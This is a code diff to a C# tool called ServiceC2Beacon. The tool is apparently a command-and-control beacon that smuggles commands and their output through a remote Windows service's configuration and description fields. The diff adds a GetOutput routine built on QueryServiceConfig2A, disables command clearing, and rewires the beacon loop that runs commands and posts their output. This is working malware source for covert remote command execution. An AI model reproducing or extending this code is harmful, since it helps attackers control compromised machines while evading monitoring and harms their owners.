@@ -37,6 +37,10 @@ namespace ServiceC2Beacon
         [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
         public static extern bool QueryServiceConfigA(IntPtr hService, IntPtr lpServiceConfig, UInt32 cbBufSize, out UInt32 pcbBytesNeeded);
 
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+        public static extern Boolean QueryServiceConfig2A(IntPtr hService, UInt32 dwInfoLevel, IntPtr buffer, UInt32 cbBufSize, out UInt32 pcbBytesNeeded);
+
+
         [StructLayout(LayoutKind.Sequential)]
         internal struct SERVICE_DESCRIPTION
         {
@@ -90,7 +94,7 @@ namespace ServiceC2Beacon
 
             return sleepTime;
         }
-
+        /*
         public static void ClearCommand(string host, string serviceName)
         {
             if (schService == IntPtr.Zero)
@@ -108,6 +112,43 @@ namespace ServiceC2Beacon
             {
                 Console.WriteLine("[-] Failed to clear command");
             }
+        }
+        */
+        public static string GetOutput(string host, string serviceName)
+        {
+            string output = "";
+
+            if (schService == IntPtr.Zero)
+            {
+                Console.WriteLine("Lost handle... Trying to reestablish");
+                ConnectToService(host, serviceName);
+                if (schService == IntPtr.Zero)
+                {
+                    Console.WriteLine("[-] Failed to reconnect... Shutting down");
+                    Environment.Exit(1);
+                }
+            }
+
+            IntPtr buffer = IntPtr.Zero;
+            uint dwBytesNeeded = 0;
+
+            bool result = QueryServiceConfig2A(schService, 1, IntPtr.Zero, dwBytesNeeded, out dwBytesNeeded);
+            IntPtr ptr = Marshal.AllocHGlobal((int)dwBytesNeeded);
+            result = QueryServiceConfig2A(schService, 1, ptr, dwBytesNeeded, out dwBytesNeeded);
+
+            SERVICE_DESCRIPTION service_description = new SERVICE_DESCRIPTION();
+            Console.WriteLine(result);
+            if (result)
+            {
+                service_description = (SERVICE_DESCRIPTION)Marshal.PtrToStructure(ptr, new SERVICE_DESCRIPTION().GetType());
+                output = service_description.lpDescription;
+                Console.WriteLine("Output: " + output);
+            }
+            Marshal.FreeHGlobal(ptr);
+
+            return output;
+
+
 
         }
 
@@ -140,7 +181,7 @@ namespace ServiceC2Beacon
             }
             Marshal.FreeHGlobal(ptr);
 
-            ClearCommand(host, serviceName);
+            //ClearCommand(host, serviceName);
 
             return cmd;
         }
@@ -273,7 +314,10 @@ namespace ServiceC2Beacon
                         Environment.Exit(0);
                     }
 
-                    if (command.Length > 0)
+                    string lastOutput = GetOutput(host, serviceName);
+
+
+                    if (lastOutput.Length > 0)
                     {
                         string output = RunCommand(command);
                         PostOutput(host, serviceName, output);
